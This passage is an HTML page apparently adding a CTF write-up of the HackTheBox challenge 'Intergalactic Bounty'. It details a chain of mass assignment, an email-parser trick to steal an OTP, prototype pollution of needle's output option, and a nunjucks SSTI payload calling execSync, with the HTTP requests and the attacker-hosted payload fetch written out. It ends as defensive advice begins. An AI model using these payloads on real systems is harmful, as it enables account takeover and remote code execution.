@@ -1,0 +1,1150 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Intergalactic Bounty — HTB CTF Writeup | Abdelaaziz Belkhair</title>
+    <meta name="description"
+        content="HTB CTF Writeup: Intergalactic Bounty — Five-stage kill chain: mass assignment, email parser differential, prototype pollution, needle gadget, and nunjucks SSTI to RCE.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
+        integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg=="
+        crossorigin="anonymous" referrerpolicy="no-referrer">
+    <style>
+        :root {
+            --primary: #00d4ff;
+            --accent: #ff6b6b;
+            --success: #00ff88;
+            --bg: #0a0a0a;
+            --bg-card: #111111;
+            --bg-terminal: #0d0d0d;
+            --text: #e4e4e7;
+            --text-secondary: #a1a1aa;
+            --text-muted: #71717a;
+            --border: #27272a;
+            --orange: #f97316;
+            --purple: #a78bfa;
+        }
+
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.8;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        a {
+            color: var(--primary);
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        a:hover {
+            color: var(--success);
+        }
+
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 100;
+            background: rgba(10, 10, 10, 0.95);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--border);
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 24px;
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+
+        .logo {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: var(--primary);
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 1.75rem;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+
+        .nav-links a:hover {
+            color: var(--primary);
+        }
+
+        main {
+            padding-top: 100px;
+            padding-bottom: 60px;
+        }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: var(--text-secondary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .back-link:hover {
+            color: var(--primary);
+        }
+
+        /* ── Challenge Card (HTB-style) ── */
+        .challenge-card {
+            background: linear-gradient(135deg, rgba(249, 115, 22, 0.08) 0%, rgba(0, 212, 255, 0.04) 100%);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 2rem 2.5rem;
+            margin-bottom: 2rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .challenge-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--orange), var(--primary), var(--purple));
+        }
+
+        .challenge-card::after {
+            content: '';
+            position: absolute;
+            top: -60px;
+            right: -60px;
+            width: 180px;
+            height: 180px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(249, 115, 22, 0.08) 0%, transparent 70%);
+            pointer-events: none;
+        }
+
+        .challenge-platform {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--success);
+            background: rgba(0, 255, 136, 0.1);
+            padding: 0.3rem 0.75rem;
+            border-radius: 20px;
+            margin-bottom: 1rem;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .challenge-title {
+            font-size: 2.2rem;
+            font-weight: 700;
+            line-height: 1.2;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(135deg, var(--text) 0%, var(--text-secondary) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .challenge-subtitle {
+            color: var(--text-secondary);
+            font-size: 1.05rem;
+            margin-bottom: 1.5rem;
+            max-width: 650px;
+        }
+
+        .challenge-meta {
+            display: flex;
+            gap: 0.6rem;
+            flex-wrap: wrap;
+            margin-bottom: 1.5rem;
+        }
+
+        .meta-badge {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.7rem;
+            padding: 0.3rem 0.7rem;
+            border-radius: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+            font-weight: 600;
+        }
+
+        .meta-badge.date {
+            color: var(--primary);
+            background: rgba(0, 212, 255, 0.12);
+        }
+
+        .meta-badge.category {
+            color: var(--purple);
+            background: rgba(167, 139, 250, 0.12);
+        }
+
+        .meta-badge.tag {
+            color: var(--orange);
+            background: rgba(249, 115, 22, 0.12);
+        }
+
+        .challenge-stats {
+            display: flex;
+            gap: 1px;
+            background: var(--border);
+            border-radius: 12px;
+            overflow: hidden;
+            margin-top: 0.5rem;
+        }
+
+        .stat-item {
+            flex: 1;
+            padding: 1rem;
+            text-align: center;
+            background: var(--bg-card);
+        }
+
+        .stat-item:first-child {
+            border-radius: 12px 0 0 12px;
+        }
+
+        .stat-item:last-child {
+            border-radius: 0 12px 12px 0;
+        }
+
+        .stat-value {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.3rem;
+            font-weight: 700;
+            display: block;
+        }
+
+        .stat-value.difficulty-medium {
+            color: var(--orange);
+        }
+
+        .stat-value.difficulty-hard {
+            color: var(--accent);
+        }
+
+        .stat-value.difficulty-easy {
+            color: var(--success);
+        }
+
+        .stat-value.impact {
+            color: var(--accent);
+        }
+
+        .stat-value.vulns {
+            color: var(--primary);
+        }
+
+        .stat-label {
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-top: 0.25rem;
+        }
+
+        /* ── Table of Contents ── */
+        .toc {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1.25rem 1.5rem;
+            margin-bottom: 2rem;
+        }
+
+        .toc-title {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 0.75rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .toc-title::before {
+            content: '';
+            width: 12px;
+            height: 2px;
+            background: var(--orange);
+        }
+
+        .toc ol {
+            list-style: none;
+            counter-reset: toc-counter;
+            padding: 0;
+            margin: 0;
+        }
+
+        .toc li {
+            counter-increment: toc-counter;
+            margin-bottom: 0.25rem;
+        }
+
+        .toc li a {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            color: var(--text-secondary);
+            font-size: 0.85rem;
+            padding: 0.35rem 0.5rem;
+            border-radius: 6px;
+            transition: all 0.15s;
+        }
+
+        .toc li a:hover {
+            color: var(--orange);
+            background: rgba(249, 115, 22, 0.06);
+        }
+
+        .toc li a::before {
+            content: counter(toc-counter, decimal-leading-zero);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            min-width: 20px;
+        }
+
+        /* ── Article Content ── */
+        .article-content h2 {
+            font-size: 1.35rem;
+            margin: 2.5rem 0 1rem;
+            color: var(--text);
+            padding-bottom: 0.6rem;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .article-content h2::before {
+            content: '';
+            width: 4px;
+            height: 22px;
+            background: var(--orange);
+            border-radius: 2px;
+            flex-shrink: 0;
+        }
+
+        .article-content h3 {
+            font-size: 1.1rem;
+            margin: 1.5rem 0 0.75rem;
+            color: var(--text);
+        }
+
+        .article-content h4 {
+            font-size: 0.95rem;
+            margin: 1.25rem 0 0.5rem;
+            color: var(--text-secondary);
+        }
+
+        .article-content p {
+            margin-bottom: 1rem;
+            color: var(--text-secondary);
+        }
+
+        .article-content ul,
+        .article-content ol {
+            margin: 1rem 0;
+            padding-left: 1.5rem;
+            color: var(--text-secondary);
+        }
+
+        .article-content li {
+            margin-bottom: 0.5rem;
+        }
+
+        /* ── Code Blocks ── */
+        .article-content pre {
+            background: var(--bg-terminal);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 1.25rem 1.25rem 1.25rem;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            line-height: 1.6;
+            position: relative;
+        }
+
+        .article-content pre::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, var(--orange) 0%, transparent 100%);
+            border-radius: 10px 10px 0 0;
+        }
+
+        .article-content code {
+            font-family: 'JetBrains Mono', monospace;
+            background: rgba(249, 115, 22, 0.1);
+            padding: 0.15rem 0.45rem;
+            border-radius: 4px;
+            font-size: 0.83em;
+            color: var(--orange);
+        }
+
+        .article-content pre code {
+            background: none;
+            padding: 0;
+            color: var(--text-secondary);
+        }
+
+        /* ── Info & Warning Boxes ── */
+        .info-box {
+            background: rgba(0, 212, 255, 0.06);
+            border: 1px solid rgba(0, 212, 255, 0.15);
+            border-left: 3px solid var(--primary);
+            padding: 1.25rem 1.5rem;
+            border-radius: 0 10px 10px 0;
+            margin: 1.5rem 0;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        .warning-box {
+            background: rgba(255, 107, 107, 0.06);
+            border: 1px solid rgba(255, 107, 107, 0.15);
+            border-left: 3px solid var(--accent);
+            padding: 1.25rem 1.5rem;
+            border-radius: 0 10px 10px 0;
+            margin: 1.5rem 0;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        /* ── Tables ── */
+        table {
+            width: 100%;
+            border-collapse: separate;
+            border-spacing: 0;
+            margin: 1.5rem 0;
+            font-size: 0.85rem;
+            border-radius: 10px;
+            overflow: hidden;
+            border: 1px solid var(--border);
+        }
+
+        th,
+        td {
+            padding: 0.7rem 1rem;
+            text-align: left;
+        }
+
+        th {
+            background: var(--bg-terminal);
+            color: var(--primary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.78rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        td {
+            color: var(--text-secondary);
+            border-bottom: 1px solid rgba(39, 39, 42, 0.5);
+        }
+
+        tr:last-child td {
+            border-bottom: none;
+        }
+
+        tr:hover td {
+            background: rgba(249, 115, 22, 0.03);
+        }
+
+        td code {
+            font-size: 0.8em;
+        }
+
+        hr {
+            border: none;
+            border-top: 1px solid var(--border);
+            margin: 2rem 0;
+        }
+
+        /* ── Pwned Banner ── */
+        .pwned-banner {
+            text-align: center;
+            padding: 2.5rem 2rem;
+            margin: 3rem 0 1rem;
+            background: linear-gradient(135deg, rgba(0, 255, 136, 0.06) 0%, rgba(0, 212, 255, 0.04) 100%);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            border-radius: 16px;
+            position: relative;
+        }
+
+        .pwned-banner::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--success), var(--primary));
+        }
+
+        .pwned-icon {
+            font-size: 2.5rem;
+            margin-bottom: 0.75rem;
+            display: block;
+        }
+
+        .pwned-text {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--success);
+            text-transform: uppercase;
+            letter-spacing: 3px;
+        }
+
+        .pwned-sub {
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            margin-top: 0.5rem;
+        }
+
+        /* ── Footer ── */
+        footer {
+            padding: 1.5rem 0;
+            border-top: 1px solid var(--border);
+            text-align: center;
+        }
+
+        footer p {
+            color: var(--text-muted);
+            font-size: 0.8rem;
+        }
+
+        /* ── Responsive ── */
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+            }
+
+            .challenge-title {
+                font-size: 1.6rem;
+            }
+
+            .challenge-card {
+                padding: 1.5rem;
+            }
+
+            .challenge-stats {
+                flex-wrap: wrap;
+            }
+
+            .stat-item {
+                min-width: 80px;
+            }
+
+            table {
+                font-size: 0.75rem;
+            }
+
+            th,
+            td {
+                padding: 0.4rem 0.6rem;
+            }
+
+            .toc {
+                display: none;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <nav>
+            <a href="../index.html" class="logo">AB_</a>
+            <ul class="nav-links">
+                <li><a href="../index.html">Accueil</a></li>
+                <li><a href="../blog.html">Blog</a></li>
+                <li><a href="../writeups.html">Writeups</a></li>
+                <li><a href="../index.html#contact">Contact</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main class="container">
+        <a href="../writeups.html" class="back-link"><i class="fas fa-arrow-left"></i> Retour aux writeups</a>
+
+        <article>
+            <div class="challenge-card">
+                <span class="challenge-platform"><i class="fas fa-flag"></i> HackTheBox CTF</span>
+                <h1 class="challenge-title">Intergalactic Bounty</h1>
+                <p class="challenge-subtitle">Five-stage kill chain chaining mass assignment, email parser differential,
+                    prototype pollution, a needle HTTP client gadget, and nunjucks SSTI to achieve full RCE.</p>
+                <div class="challenge-meta">
+                    <span class="meta-badge date"><i class="fas fa-calendar"></i> 2026-02-16</span>
+                    <span class="meta-badge category">Web Exploitation</span>
+                    <span class="meta-badge tag">Mass Assignment</span>
+                    <span class="meta-badge tag">Prototype Pollution</span>
+                    <span class="meta-badge tag">SSTI</span>
+                    <span class="meta-badge tag">RCE</span>
+                </div>
+                <div class="challenge-stats">
+                    <div class="stat-item">
+                        <span class="stat-value difficulty-hard">Hard</span>
+                        <span class="stat-label">Difficulty</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-value vulns">5</span>
+                        <span class="stat-label">Vulns Chained</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-value impact">RCE</span>
+                        <span class="stat-label">Impact</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-value difficulty-medium">Node.js</span>
+                        <span class="stat-label">Stack</span>
+                    </div>
+                </div>
+            </div>
+
+            <nav class="toc">
+                <div class="toc-title">Table of Contents</div>
+                <ol>
+                    <li><a href="#s1">Reconnaissance</a></li>
+                    <li><a href="#s2">Mass Assignment — Instant Admin</a></li>
+                    <li><a href="#s3">Email Parser Differential — OTP Trick</a></li>
+                    <li><a href="#s4">Missing Sanitization — The Open Door</a></li>
+                    <li><a href="#s5">Prototype Pollution + needle Gadget</a></li>
+                    <li><a href="#s6">SSTI — From Template to Shell</a></li>
+                    <li><a href="#s7">Full Attack Chain</a></li>
+                    <li><a href="#s8">Vulnerability Summary</a></li>
+                    <li><a href="#s9">Defensive Recommendations</a></li>
+                    <li><a href="#s10">Key Lessons</a></li>
+                </ol>
+            </nav>
+
+            <div class="article-content">
+
+                <div class="info-box">
+                    <strong>Challenge</strong>: Galactic Bounty Board<br>
+                    <strong>Category</strong>: Web Exploitation<br>
+                    <strong>Difficulty</strong>: Hard<br>
+                    <strong>Flag</strong>: <code>HTB{REDACTED}</code><br>
+                    <strong>Stack</strong>: Node.js / Express / nunjucks / needle / MailHog
+                </div>
+
+                <p>I'll be honest — this one took me a while. It's one of those challenges where no single bug is enough
+                    on its own. You've got to pull five completely different threads and braid them into a single rope
+                    strong enough to hang the whole application. Let me walk you through how each piece clicked into
+                    place, from the moment I loaded the page to the moment the flag appeared.</p>
+
+                <h2 id="s1">1. Reconnaissance</h2>
+
+                <h3>First Impressions</h3>
+
+                <p>The application greets you with a fairly typical login/register setup — the <strong>Galactic Bounty
+                        Board</strong>. Nothing fancy on the surface: a form, some buttons, a clean UI. Behind the
+                    scenes, <code>script.js</code> handles all the authentication flows: registration, login, OTP
+                    verification, and email sending.</p>
+
+                <p>I pulled up <code>script.js</code> and traced every endpoint it touches. Four stood out immediately:
+                </p>
+
+                <ul>
+                    <li><code>/api/register</code> — account creation</li>
+                    <li><code>/api/login</code> — authentication</li>
+                    <li><code>/api/verify</code> — OTP email verification</li>
+                    <li><code>/api/sendEmail</code> — resend verification</li>
+                </ul>
+
+                <p>One thing I noticed early: every message in the frontend gets rendered through jQuery's
+                    <code>.text()</code> rather than <code>.html()</code>. So client-side XSS is off the table.
+                    Whatever's interesting about this app lives on the server.</p>
+
+                <h3>The Internal Mail Service</h3>
+
+                <p>There's a companion mail page — an inbox that shows emails addressed to <code>test@email.htb</code>.
+                    I spotted the target address right in the HTML:</p>
+
+                <pre><code>&lt;div class="alert-center"&gt;
+    Your email address is &lt;strong&gt;test@email.htb&lt;/strong&gt;
+&lt;/div&gt;</code></pre>
+
+                <p>The inbox loads emails dynamically from a MailHog instance running on <code>127.0.0.1:9000</code>.
+                    Only emails whose <code>Raw.To</code> contains exactly <code>test@email.htb</code> show up. This
+                    detail seemed like a footnote at first, but — spoiler — it turns out to be the entire mechanism
+                    behind vulnerability number two.</p>
+
+                <h2 id="s2">2. Mass Assignment — Registering as Admin</h2>
+
+                <h3>The Flaw at a Glance</h3>
+
+                <p>Here's the registration handler, stripped down to the part that matters:</p>
+
+                <pre><code>const registerAPI = async (req, res) => {
+  const { email, password, role = "guest" } = req.body;
+  const emailDomain = emailAddresses.parseOneAddress(email)?.domain;
+
+  if (!emailDomain || emailDomain !== 'interstellar.htb') {
+    return res.status(200).json({ message: 'Registration is not allowed for this email domain' });
+  }
+
+  try {
+    await User.createUser(email, password, role);
+    return res.json({ message: "User registered. Verification email sent.", status: 201 });
+  }
+};</code></pre>
+
+                <p>See the problem? The developer writes <code>role = "guest"</code> as a destructuring default,
+                    thinking that ensures every new user starts as a guest. But JavaScript destructuring defaults only
+                    kick in when the property is <strong>absent</strong> from the object. If I <em>include</em>
+                    <code>role</code> in my request body, my value gets used instead — passed straight through to the
+                    database.</p>
+
+                <div class="info-box">
+                    <strong>Why this works</strong>: JavaScript's <code>const { role = "guest" } = req.body</code> only
+                    applies the default when <code>req.body.role</code> is <code>undefined</code>. If I send
+                    <code>"role": "admin"</code>, the default is ignored.
+                </div>
+
+                <h3>The Exploit</h3>
+
+                <p>I fired off the registration request with an extra field:</p>
+
+                <pre><code>POST /api/register
+
+{
+  "email": "attacker@interstellar.htb",
+  "password": "mypassword",
+  "role": "admin"
+}</code></pre>
+
+                <p>The server happily accepted it. I now had an admin account in the database — but I couldn't log in
+                    yet. The account still needed OTP verification, and that email went to
+                    <code>interstellar.htb</code>, a domain I don't control. Which brings us to the real puzzle.</p>
+
+                <h2 id="s3">3. Email Parser Differential — Stealing the OTP</h2>
+
+                <h3>The Filtering Problem</h3>
+
+                <p>The internal inbox only shows emails addressed to <code>test@email.htb</code>. The inbox filtering
+                    logic compares each recipient with a strict equality check:</p>
+
+                <pre><code>for (let item of response.data.items) {
+    const recipients = item.Raw.To || [];
+    if (recipients.some((recipient) => recipient === 'test@email.htb')) {
+        mails.push(item);
+    }
+}</code></pre>
+
+                <p>My verification email goes to <code>attacker@interstellar.htb</code>, which doesn't match. I can't
+                    read it. So I needed a way to register with an address that passes the <code>interstellar.htb</code>
+                    domain check <strong>and</strong> simultaneously delivers the email to <code>test@email.htb</code>.
+                </p>
+
+                <p>Sounds impossible. But two different email parsers disagree about what constitutes a valid address —
+                    and that disagreement is exactly the gap I needed.</p>
+
+                <h3>RFC 5322 Comments to the Rescue</h3>
+
+                <p>The registration endpoint uses the <code>email-addresses</code> npm library — a strict RFC 5322
+                    parser. Nodemailer, which actually sends the email, uses its own looser parser. RFC 5322 says that
+                    anything inside parentheses is a <strong>comment</strong> and should be semantically ignored. So I
+                    crafted this monstrosity:</p>
+
+                <pre><code>&lt;(&lt;test@email.htb&gt;)y@interstellar.htb&gt;</code></pre>
+
+                <p>Here's what each parser sees:</p>
+
+                <ul>
+                    <li><strong><code>email-addresses</code></strong> (strict): Sees one valid address. The
+                        <code>(&lt;test@email.htb&gt;)</code> portion is an RFC comment — discarded. Extracts
+                        <code>y@interstellar.htb</code> as the actual address. Domain = <code>interstellar.htb</code>. ✅
+                    </li>
+                    <li><strong>Nodemailer</strong> (loose): Spots angle brackets around <code>test@email.htb</code>
+                        inside the string and interprets it as a real delivery target. Issues SMTP <code>RCPT TO</code>
+                        for both <code>test@email.htb</code> and the outer address. MailHog receives the email with
+                        <code>test@email.htb</code> in <code>Raw.To</code>.</li>
+                </ul>
+
+                <p>The domain check passes. The email lands in the inbox. I can read the OTP.</p>
+
+                <h3>Executing the Chain</h3>
+
+                <p><strong>Step 1</strong> — Register with the crafted address:</p>
+
+                <pre><code>POST /api/register
+{
+  "email": "&lt;(&lt;test@email.htb&gt;)y@interstellar.htb&gt;",
+  "password": "mypassword",
+  "role": "admin"
+}</code></pre>
+
+                <p><strong>Step 2</strong> — Trigger the OTP:</p>
+
+                <pre><code>POST /api/sendEmail
+{
+  "email": "&lt;(&lt;test@email.htb&gt;)y@interstellar.htb&gt;"
+}</code></pre>
+
+                <p><strong>Step 3</strong> — Read the OTP from the inbox, then verify:</p>
+
+                <pre><code>POST /api/verify
+{
+  "email": "&lt;(&lt;test@email.htb&gt;)y@interstellar.htb&gt;",
+  "code": "839271"
+}</code></pre>
+
+                <p>Logged in. JWT token issued with <code>role: "admin"</code>. The admin panel opens up — and with it,
+                    a <code>/transmit</code> feature for making server-side HTTP requests.</p>
+
+                <h2 id="s4">4. Missing Sanitization — The Open Door Nobody Locked</h2>
+
+                <h3>Add vs. Edit</h3>
+
+                <p>Here's where things get interesting. The application has two endpoints for managing bounties — one to
+                    create, one to edit. Compare them:</p>
+
+                <pre><code>// Add endpoint — sanitization applied
+const addBountiesAPI = async (req, res) => {
+  const { status = "unapproved", ...bountyData } = req.body;
+  const sanitizedBountyData = sanitizeHTMLContent(bountyData); // ← sanitizer runs
+  await BountyModel.create({ ...sanitizedBountyData, status });
+};
+
+// Edit endpoint — no sanitization
+const editBountiesAPI = async (req, res) => {
+  const { ...bountyData } = req.body;
+  const data = await BountyModel.findByPk(req.params.id, { ... });
+  const updated = mergedeep(data.toJSON(), bountyData); // ← raw user data merged directly
+  await data.update(updated);
+};</code></pre>
+
+                <p>The sanitizer exists. It works. But whoever wrote the edit endpoint just... forgot to call it. Raw
+                    user input flows straight from <code>req.body</code> into a deep merge function, then into the
+                    database. Since bounty descriptions are rendered with nunjucks' <code>| safe</code> filter (to
+                    support rich HTML in the seeded demo data), anything I inject gets rendered without escaping.</p>
+
+                <div class="warning-box">
+                    <strong>This is the pattern that kills</strong>: The defense existed, it was just applied
+                    inconsistently. The add endpoint is safe. The edit endpoint is wide open. One code review of the
+                    edit route alone would have caught it — but nobody reviewed it separately from the add route they'd
+                    already secured.
+                </div>
+
+                <p>But I'm not here for stored XSS. I need something more powerful. What I really want is to abuse that
+                    <code>mergedeep</code> call for something far nastier.</p>
+
+                <h2 id="s5">5. Prototype Pollution + needle Gadget — Writing Arbitrary Files</h2>
+
+                <h3>Poisoning the Prototype</h3>
+
+                <p>That <code>mergedeep</code> call in the edit endpoint uses <code>@christopy/mergedeep</code> — a
+                    package the challenge author deliberately placed as a vulnerable dependency. Like most vulnerable
+                    merge libraries, it recursively traverses the source object without filtering dangerous keys like
+                    <code>__proto__</code>.</p>
+
+                <p>So I sent this to the edit endpoint:</p>
+
+                <pre><code>PUT /api/bounties/2
+
+{
+  "__proto__": {
+    "output": "/app/views/index.html"
+  }
+}</code></pre>
+
+                <p>After this request, <strong>every plain object</strong> in the entire Node.js process inherits
+                    <code>output: "/app/views/index.html"</code> through the prototype chain. Not as an own property —
+                    you won't see it if you inspect the object directly — but it's there, lurking, waiting for something
+                    to read it.</p>
+
+                <h3>The needle HTTP Client — The Unwitting Accomplice</h3>
+
+                <p>The app has a <code>fetchURL</code> utility that uses the <code>needle</code> HTTP client:</p>
+
+                <pre><code>const fetchURL = async (url) => {
+  if (!url.startsWith("http://") &amp;&amp; !url.startsWith("https://")) {
+    throw new Error("Invalid URL");
+  }
+
+  const options = {
+    compressed: true,
+    follow_max: 0,
+    // no "output" property here
+  };
+
+  return new Promise((resolve, reject) => {
+    needle.get(url, options, (err, resp, body) => {
+      resolve(body);
+    });
+  });
+};</code></pre>
+
+                <p>Look at that <code>options</code> object carefully. It has <code>compressed</code> and
+                    <code>follow_max</code>. No <code>output</code> property. But here's the thing — needle has a
+                    documented feature: if <code>options.output</code> is set, it writes the HTTP response body directly
+                    to that file path on disk.</p>
+
+                <p>When needle internally checks <code>options.output</code>, JavaScript first looks at the object
+                    itself (not found), then walks up the prototype chain — and there it is. The value I planted via
+                    prototype pollution. Needle dutifully writes the response body to
+                    <code>/app/views/index.html</code>.</p>
+
+                <div class="info-box">
+                    <strong>The subtlety here is terrifying</strong>: The vulnerability isn't in the code that gets
+                    exploited (needle). It's in a completely different part of the application (the merge function). A
+                    reviewer auditing needle usage in isolation would find nothing wrong. A reviewer auditing the merge
+                    function might spot the pollution but not imagine the needle gadget. Only full data-flow analysis
+                    reveals the chain.
+                </div>
+
+                <h2 id="s6">6. SSTI — From Template Overwrite to Shell Access</h2>
+
+                <h3>Crafting the Payload</h3>
+
+                <p>Now I control what gets written to <code>/app/views/index.html</code>. The application uses nunjucks
+                    as its template engine. When someone visits the index page, nunjucks renders that file — evaluating
+                    any template syntax it finds.</p>
+
+                <p>I hosted the following nunjucks SSTI payload on my server:</p>
+
+                <pre><code>{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /flag.txt')")()}}</code></pre>
+
+                <p>It works because <code>range</code> is a built-in nunjucks object. Accessing
+                    <code>.constructor</code> gives you the JavaScript <code>Function</code> constructor. Calling it
+                    with a string creates a new function whose body is that string. Invoking it executes arbitrary
+                    JavaScript — including spawning child processes.</p>
+
+                <h3>Pulling the Trigger</h3>
+
+                <p><strong>Step 1</strong> — Poison the prototype (already done).</p>
+
+                <p><strong>Step 2</strong> — Trigger needle to fetch my payload:</p>
+
+                <pre><code>POST /api/transmit
+{
+  "url": "http://my-server.com/payload"
+}</code></pre>
+
+                <p>Needle fetches the URL, finds <code>output</code> on the prototype chain, writes my SSTI payload to
+                    <code>/app/views/index.html</code>.</p>
+
+                <p><strong>Step 3</strong> — Visit the index page. Nunjucks evaluates the template, executes
+                    <code>tail /flag.txt</code>, and the flag appears right in the HTTP response.</p>
+
+                <h2 id="s7">7. Full Attack Chain</h2>
+
+                <pre><code>┌─────────────────────────────────────────────────────────────────────┐
+│              INTERGALACTIC BOUNTY — FULL KILL CHAIN                │
+├──────────┬──────────────────────────────────────────────────────────┤
+│ Phase 1  │ Mass Assignment → Register with role: "admin"           │
+│          │ POST /api/register with {"role":"admin"} in body        │
+├──────────┼──────────────────────────────────────────────────────────┤
+│ Phase 2  │ Email Parser Differential → Steal OTP                   │
+│          │ Register with RFC 5322 comment to cc test@email.htb     │
+│          │ Read OTP from inbox, verify account                     │
+├──────────┼──────────────────────────────────────────────────────────┤
+│ Phase 3  │ Login → JWT with role: "admin" → access /transmit       │
+├──────────┼──────────────────────────────────────────────────────────┤
+│ Phase 4  │ Prototype Pollution via edit endpoint                   │
+│          │ PUT /api/bounties/2 with __proto__.output = template    │
+├──────────┼──────────────────────────────────────────────────────────┤
+│ Phase 5  │ needle gadget → Arbitrary file write                    │
+│          │ POST /api/transmit fetches SSTI payload, needle writes  │
+│          │ response to /app/views/index.html via polluted proto    │
+├──────────┼──────────────────────────────────────────────────────────┤
+│ Phase 6  │ SSTI Execution → Visit index page, nunjucks evaluates   │
+│          │ template, execSync('tail /flag.txt') → flag rendered    │
+└──────────┴──────────────────────────────────────────────────────────┘</code></pre>
+
+                <h2 id="s8">8. Vulnerability Summary</h2>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>#</th>
+                            <th>Vulnerability</th>
+                            <th>Location</th>
+                            <th>Class</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>1</td>
+                            <td>Mass Assignment</td>
+                            <td><code>registerAPI</code> — destructuring <code>req.body</code></td>
+                            <td>Improper Input Validation</td>
+                        </tr>
+                        <tr>
+                            <td>2</td>
+                            <td>Email Parser Differential</td>
+                            <td><code>parseOneAddress</code> vs. nodemailer</td>
+                            <td>Parser Inconsistency</td>
+                        </tr>
+                        <tr>
+                            <td>3</td>
+                            <td>Missing Sanitization</td>
+                            <td><code>editBountiesAPI</code> — no <code>sanitizeHTMLContent</code></td>
+                            <td>Incomplete Defense</td>
+                        </tr>
+                        <tr>
+                            <td>4</td>
+                            <td>Prototype Pollution</td>
+                            <td><code>@christopy/mergedeep</code> — <code>__proto__</code> not filtered</td>
+                            <td>Prototype Pollution</td>
+                        </tr>
+                        <tr>
+                            <td>4b</td>
+                            <td>needle <code>output</code> gadget</td>
+                            <td><code>fetchURL</code> — inherited property triggers file write</td>
+                            <td>Pollution Gadget</td>
+                        </tr>
+                        <tr>
+                            <td>5</td>
+                            <td>Server-Side Template Injection</td>
+                            <td>nunjucks renders attacker-controlled file</td>
+                            <td>SSTI / RCE</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h2 id="s9">9. Defensive Recommendations</h2>
+
+                <h3>Mass Assignment</h3>
+
+                <p>Never destructure sensitive fields from request bodies. Explicitly assign server-controlled values:
+                </p>
+
+                <pre><code>// Vulnerable
